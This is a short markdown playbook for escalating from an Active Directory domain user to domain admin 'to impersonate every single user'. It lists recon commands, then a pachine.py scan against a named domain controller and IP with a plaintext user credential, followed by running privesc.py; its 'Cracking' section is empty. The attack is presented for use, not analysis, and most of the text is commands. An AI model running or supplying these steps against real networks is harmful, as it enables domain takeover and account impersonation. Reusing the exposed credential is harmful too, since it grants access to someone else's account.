# Procedure to privesc from domain user to domain admin -> impersonate every single user

## Recon
In order to get the exploit to work, we have to run some commands to check if the vuln is still here :

Install AD utils on the computer used to recon (with local privileged account): 

`Add-WindowsCapability –online –Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"`

Login into domain account and open a powershell :

`cd ./Downloads`

`Get-ADDomainController > dc.txt`

## Exploitation

Boot with a kali USB on one of the PC and get started.

Check if the vuln is there :

`python3 pachine.py -dc-host WIN-CQKL0KHIEF1.stb2018.local -dc-ip 10.0.2.4 -scan 'stb2018.local/DEVILLE:f9uf6'`

Then go for it :

`python3 privesc.py`

## Cracking 

